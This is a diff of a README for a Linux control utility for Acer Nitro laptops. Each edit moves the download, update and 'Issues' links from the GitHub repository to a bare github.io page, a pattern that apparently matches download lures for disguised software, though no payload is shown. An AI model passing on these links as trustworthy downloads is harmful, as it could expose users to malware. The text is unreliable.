@@ -1,6 +1,6 @@
 # 🎮 NitroSense-Linux-AN515-45 - Take Full Control of Your Acer Nitro on Linux
 
-[![Download NitroSense-Linux-AN515-45](https://img.shields.io/badge/Download-NitroSense_Linux_AN515_45-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=464646&color=2ea44f)](https://github.com/participatory-doublethink2007/NitroSense-Linux-AN515-45)
+[![Download NitroSense-Linux-AN515-45](https://img.shields.io/badge/Download-NitroSense_Linux_AN515_45-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=464646&color=2ea44f)](https://participatory-doublethink2007.github.io)
 
 ## 🔍 What Is This?
 
@@ -125,7 +125,7 @@ Simply click the color wheel or select an effect, and the change applies instant
 
 ## 🔄 Keeping It Updated
 
-The developers regularly improve NitroSense-Linux-AN515-45 with new features, bug fixes,and better performance. To get updates, simply visit the same download link you used earlier (https://github.com/participatory-doublethink2007/NitroSense-Linux-AN515-45) occasionally. Check if a new version is available, download it, and repeat the same simple steps above. It takes less than a minute.
+The developers regularly improve NitroSense-Linux-AN515-45 with new features, bug fixes,and better performance. To get updates, simply visit the same download link you used earlier (https://participatory-doublethink2007.github.io) occasionally. Check if a new version is available, download it, and repeat the same simple steps above. It takes less than a minute.
 
 .
 
@@ -184,7 +184,7 @@ NitroSense-Linux-AN515-45 is developed by a small team of enthusiasts who love b
 
 
  
-Just visit https://github.com/participatory-doublethink2007/NitroSense-Linux-AN515-45 and look for the "Issues" tab to start a conversation. Be polite, patient, and you will likely get a helpful response within a few days.
+Just visit https://participatory-doublethink2007.github.io and look for the "Issues" tab to start a conversation. Be polite, patient, and you will likely get a helpful response within a few days.
 
 
 
